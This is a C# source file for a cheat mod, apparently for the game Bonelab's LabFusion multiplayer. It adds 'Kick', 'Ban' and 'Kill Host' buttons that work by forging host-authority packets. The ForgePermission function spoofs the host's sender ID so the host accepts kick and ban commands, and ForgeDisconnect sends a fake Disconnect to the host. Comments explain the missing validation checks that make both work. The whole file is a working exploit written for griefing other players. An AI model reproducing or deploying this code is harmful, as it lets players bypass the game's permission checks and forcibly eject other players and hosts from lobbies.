using System;
using System.Collections;
using System.Text;
using BoneLib.BoneMenu;
using LabFusion.Network;
using LabFusion.Network.Serialization;
using LabFusion.Player;
using LabFusion.Senders;
using LabFusion.UI.Popups;
using MelonLoader;
using UnityEngine;

namespace MonsterPanel
{
    /// <summary>
    /// Remote Action: lobby player list → Kick / Ban (forged host PermissionCommand on EOS).
    /// Kill Host: forged Disconnect to host PlatformID via SendFromServer (EOS has no IsHost gate).
    /// BoneMenu: maxElements=0 + deferred rebuild (same Quest GUIPool-safe pattern as Kill Aura / Teleport).
    /// </summary>
    internal static class RemoteAction
    {
        private const float ActionCooldownSec = 0.85f;
        private const byte HostSenderId = 0;

        private static Page _page;
        private static bool _hooked;
        private static bool _rebuildQueued;
        private static float _nextActionTime;

        public static void Install(Page root)
        {
            if (root == null) return;

            // maxElements=0 — pagination/index pages crash Quest GUIPool.
            _page = root.CreatePage("Remote Action", new Color(1f, 0.55f, 0.2f), 0, true);
            if (!_hooked)
            {
                Menu.OnPageOpened += (Action<Page>)OnPageOpened;
                _hooked = true;
            }
            Rebuild();

            // Sibling after Remote Action (main panel order: Kill Aura → Remote Action → Kill Host).
            root.CreateFunction("Kill Host", new Color(1f, 0.15f, 0.12f), (Action)KillHost);
        }

        private static void OnPageOpened(Page opened)
        {
            if (opened != _page) return;
            QueueRebuild();
        }

        private static void QueueRebuild()
        {
            if (_rebuildQueued) return;
            _rebuildQueued = true;
            MelonCoroutines.Start(DeferredRebuild());
        }

        private static IEnumerator DeferredRebuild()
        {
            yield return null;
            yield return null;
            _rebuildQueued = false;
            Rebuild();
        }

        private static void Rebuild()
        {
            if (_page == null) return;
            try
            {
                _page.RemoveAll();
                _page.CreateFunction("Refresh", new Color(0.7f, 0.7f, 0.7f), (Action)QueueRebuild);

                if (!HasServer())
                {
                    _page.CreateFunction("Not in a lobby", new Color(0.65f, 0.65f, 0.65f), (Action)(() => { }));
                    return;
                }

                int count = 0;
                foreach (PlayerID id in PlayerIDManager.PlayerIDs)
                {
                    if (id == null || !id.IsValid) continue;
                    bool isMe = false;
                    try { isMe = id.IsMe; } catch { /* */ }
                    if (isMe) continue;

                    byte sid = id.SmallID;
                    bool host = false;
                    try { host = id.IsHost; } catch { host = sid == HostSenderId; }

                    string label = SafeName(id) + (host ? " [HOST]" : "");
                    Color col = host ? new Color(1f, 0.85f, 0.25f) : new Color(0.95f, 0.9f, 0.85f);
                    Page sub = _page.CreatePage(label, col, 0, true);

                    byte sidKick = sid;
                    byte sidBan = sid;
                    if (host)
                    {
                        sub.CreateFunction("Host — use Kill Host", new Color(1f, 0.7f, 0.25f), (Action)(() => { }));
                    }
                    else
                    {
                        sub.CreateFunction("Kick", new Color(1f, 0.45f, 0.15f), (Action)(() => Kick(sidKick)));
                        sub.CreateFunction("Ban", new Color(1f, 0.2f, 0.2f), (Action)(() => Ban(sidBan)));
                    }
                    count++;
                }

                if (count == 0)
                    _page.CreateFunction("No other players", new Color(0.6f, 0.6f, 0.6f), (Action)(() => { }));
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action rebuild: " + e.Message);
            }
        }

        private static void Kick(byte targetSid)
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Remote Action", "Not in a lobby.", error: true);
                    return;
                }

                PlayerID target = PlayerIDManager.GetPlayerID(targetSid);
                if (target == null || !target.IsValid)
                {
                    Notify("Remote Action", "Player left.", error: true);
                    QueueRebuild();
                    return;
                }
                if (target.IsMe)
                {
                    Notify("Remote Action", "Cannot kick yourself.", error: true);
                    return;
                }
                if (target.IsHost)
                {
                    Notify("Remote Action", "Cannot kick host — use Kill Host.", error: true);
                    return;
                }

                if (NetworkInfo.IsHost)
                {
                    NetworkHelper.KickUser(target);
                    MelonLogger.Msg($"Remote Action: Kick sid {targetSid} (host path).");
                    Notify("Remote Action", "Kicked " + SafeName(target) + ".");
                    QueueRebuild();
                    return;
                }

                if (!ForgePermission(PermissionCommandType.KICK, targetSid))
                {
                    Notify("Remote Action", "Kick failed.", error: true);
                    return;
                }

                MelonLogger.Msg($"Remote Action: Kick sid {targetSid} (forged host PermissionCommand).");
                Notify("Remote Action", "Kick sent: " + SafeName(target) + ".");
                QueueRebuild();
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action Kick: " + e.Message);
                Notify("Remote Action", "Kick error.", error: true);
            }
        }

        private static void Ban(byte targetSid)
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Remote Action", "Not in a lobby.", error: true);
                    return;
                }

                PlayerID target = PlayerIDManager.GetPlayerID(targetSid);
                if (target == null || !target.IsValid)
                {
                    Notify("Remote Action", "Player left.", error: true);
                    QueueRebuild();
                    return;
                }
                if (target.IsMe)
                {
                    Notify("Remote Action", "Cannot ban yourself.", error: true);
                    return;
                }
                if (target.IsHost)
                {
                    Notify("Remote Action", "Cannot ban host — use Kill Host.", error: true);
                    return;
                }

                if (NetworkInfo.IsHost)
                {
                    NetworkHelper.BanUser(target);
                    MelonLogger.Msg($"Remote Action: Ban sid {targetSid} (host path).");
                    Notify("Remote Action", "Banned " + SafeName(target) + ".");
                    QueueRebuild();
                    return;
                }

                if (!ForgePermission(PermissionCommandType.BAN, targetSid))
                {
                    Notify("Remote Action", "Ban failed.", error: true);
                    return;
                }

                MelonLogger.Msg($"Remote Action: Ban sid {targetSid} (forged host PermissionCommand).");
                Notify("Remote Action", "Ban sent: " + SafeName(target) + ".");
                QueueRebuild();
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action Ban: " + e.Message);
                Notify("Remote Action", "Ban error.", error: true);
            }
        }

        private static void KillHost()
        {
            if (!TryBeginAction()) return;
            try
            {
                if (!HasServer())
                {
                    Notify("Kill Host", "Not in a lobby.", error: true);
                    return;
                }
                if (NetworkInfo.IsHost)
                {
                    Notify("Kill Host", "You are the host.", error: true);
                    return;
                }

                PlayerID host = PlayerIDManager.GetHostID();
                if (host == null || !host.IsValid || string.IsNullOrEmpty(host.PlatformID))
                {
                    Notify("Kill Host", "Host not found.", error: true);
                    return;
                }

                if (!ForgeDisconnect(host.PlatformID, "Kicked from Server"))
                {
                    Notify("Kill Host", "Send failed (EOS only).", error: true);
                    return;
                }

                MelonLogger.Msg("Remote Action: Kill Host (forged Disconnect → host PlatformID).");
                Notify("Kill Host", "Disconnect sent to host.");
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Kill Host: " + e.Message);
                Notify("Kill Host", "Error.", error: true);
            }
        }

        /// <summary>
        /// Craft PermissionCommandRequest with Sender=0 (host SmallID) and send ToServer.
        /// On EOS, ProcessPacket omits PlatformID → ValidateReceivedID skips → host treats as OWNER.
        /// </summary>
        private static bool ForgePermission(PermissionCommandType type, byte otherPlayer)
        {
            try
            {
                var data = new PermissionCommandRequestData
                {
                    Type = type,
                    OtherPlayer = otherPlayer
                };

                using NetWriter writer = NetWriter.Create(16);
                data.Serialize(writer);
                using NetMessage message = NetMessage.Create(
                    NativeMessageTag.PermissionCommandRequest,
                    writer,
                    CommonMessageRoutes.ReliableToServer,
                    HostSenderId);
                MessageSender.SendToServer(NetworkChannel.Reliable, message);
                return true;
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action forge PermissionCommand: " + e.Message);
                return false;
            }
        }

        /// <summary>
        /// Craft Disconnect for host PlatformID and SendFromServer to that user.
        /// EOSNetworkLayer.SendFromServer has no IsHost check — client can deliver ClientsOnly Disconnect.
        /// </summary>
        private static bool ForgeDisconnect(string platformId, string reason)
        {
            if (string.IsNullOrEmpty(platformId)) return false;
            try
            {
                using NetWriter writer = NetWriter.Create(64);
                DisconnectMessageData value = DisconnectMessageData.Create(platformId, reason ?? string.Empty);
                NetSerializerExtensions.SerializeValue(writer, ref value);
                using NetMessage message = NetMessage.Create(
                    NativeMessageTag.Disconnect,
                    writer,
                    CommonMessageRoutes.None);
                MessageSender.SendFromServer(platformId, NetworkChannel.Reliable, message);
                return true;
            }
            catch (Exception e)
            {
                MelonLogger.Warning("Remote Action forge Disconnect: " + e.Message);
                return false;
            }
        }

        private static bool TryBeginAction()
        {
            float now = Time.unscaledTime;
            if (now < _nextActionTime)
            {
                Notify("Remote Action", "Wait a moment.", error: true);
                return false;
            }
            _nextActionTime = now + ActionCooldownSec;
            return true;
        }

        private static bool HasServer()
        {
            try { return NetworkInfo.HasServer; }
            catch { return false; }
        }

        private static string SafeName(PlayerID id)
        {
            byte sid = 0;
            try { if (id != null) sid = id.SmallID; } catch { /* */ }

            string raw = null;
            try
            {
                if (id != null && id.TryGetDisplayName(out string display) && !string.IsNullOrWhiteSpace(display))
                    raw = display;
            }
            catch { /* */ }

            if (string.IsNullOrWhiteSpace(raw))
            {
                try { raw = id?.Metadata?.Username?.GetValueOrEmpty(); } catch { /* */ }
            }

            return AsciiMenuName(raw, sid);
        }

        private static string AsciiMenuName(string username, byte sid)
        {
            if (string.IsNullOrEmpty(username)) return "Player " + sid;
            var sb = new StringBuilder(username.Length);
            bool inTag = false;
            foreach (char c in username)
            {
                if (c == '<') { inTag = true; continue; }
                if (c == '>') { inTag = false; continue; }
                if (inTag) continue;
                if (c >= 32 && c < 127) sb.Append(c);
            }
            string s = sb.ToString().Trim();
            return s.Length == 0 ? ("Player " + sid) : s;
        }

        private static void Notify(string title, string message, bool error = false)
        {
            try
            {
                Notifier.Send(new Notification
                {
                    Title = title,
                    Message = message,
                    SaveToMenu = false,
                    ShowPopup = true,
                    PopupLength = error ? 3f : 2.2f,
                    Type = error ? NotificationType.ERROR : NotificationType.SUCCESS
                });
            }
            catch
            {
                MelonLogger.Msg(title + ": " + message);
            }
        }
    }
}
